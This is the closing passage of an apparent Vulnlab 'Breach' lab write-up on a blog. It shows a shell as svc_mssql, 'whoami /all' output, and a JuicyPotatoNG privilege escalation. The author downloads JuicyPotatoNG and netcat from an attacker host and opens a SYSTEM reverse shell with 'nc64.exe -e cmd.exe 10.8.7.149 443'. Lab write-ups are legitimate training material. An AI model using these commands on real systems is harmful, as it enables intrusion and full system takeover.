+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Important<span style="color:#f92672">]</span> Awaiting payload execution to initiate shell session...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span> Payload execution verified!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span> Stabilizing command prompt...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32 &gt; cd /
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\ </span>&gt; cd users
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers &gt; cd svc_mssql
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>vc_mssql &gt; cd desktop
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>vc_mssql<span style="color:#ae81ff">\d</span>esktop &gt; whoami /all
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------                                                                              
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>User Name        SID                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span> <span style="color:#f92672">=============================================</span>                                
+</span></span><span style="display:flex;"><span>breach<span style="color:#ae81ff">\s</span>vc_mssql S-1-5-21-2330692793-3312915120-706255856-1115                                
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>GROUP INFORMATION                                                                             
+</span></span><span style="display:flex;"><span>-----------------                                                                             
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID                                                             Attributes                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">===============================================================</span> <span style="color:#f92672">==================================================</span>              
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\M</span>SSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner                  
+</span></span><span style="display:flex;"><span>LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group              
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288                                                                                                                    
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION                                                                        
+</span></span><span style="display:flex;"><span>----------------------                                                                        
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>              
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled              
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled              
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain                Disabled              
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled               
+</span></span><span style="display:flex;"><span>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled               
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled               
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled               
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled              
+</span></span></code></pre></div><p>we see the SeImpersonatePrivilege present which only means one thing&hellip; POTATO!</p>
+<p>but&hellip; again the AV proved to be the most annoying part of this box.</p>
+<p>Now we need to get <code>JuicyPotatoNG</code> and <code>Netcat</code> on the box, here are the methods i used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest -Uri http://10.8.7.149/JuicyPotatoNG.exe -OutFile C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\J</span>uicyPotatoNG.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget -usebasicparsing http://10.8.7.149/nc64.exe -o nc64.exe
+</span></span></code></pre></div><p>Then perform the attack -</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#ae81ff">\J</span>uicyPotatoNG.exe -p <span style="color:#e6db74">&#34;C:\users\svc_mssql\nc64.exe&#34;</span> -a <span style="color:#e6db74">&#34;-e cmd.exe 10.8.7.149 443&#34;</span> -t *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32 &gt; whoami
+</span></span><span style="display:flex;"><span>NT<span style="color:#ae81ff">\a</span>uthority system
+</span></span></code></pre></div>
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+    
+  </section>
+
+
+        
+  
+  
+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/writeups/htb-fluffy/"
+    class="absolute inset-0"
+    aria-label="HackTheBox-Fluffy"></a>
+      
+    
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        HackTheBox-Fluffy
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <span>2319 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/writeups/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeups
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/hackthebox/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hackthebox
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/windows/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/active-directory/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Active Directory
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/cve-2025-24071/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CVE-2025-24071
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/adcs/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    ADCS
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
+    </section>
+  
+
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_writeups/vulnlab-breach.md"
+          data-oid-likes="likes_writeups/vulnlab-breach.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/writeups/htb-fluffy/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox-Fluffy</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+      
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2">
+        <ul class="flex list-none flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ltr:mr-4 rtl:ml-4">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          BeejaySec
+      </p>
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+    <a rel="me" href="https://masto.ai/@blowfish"></a>
+
+  
+  <script src="/js/copy.js"></script>
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="https://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
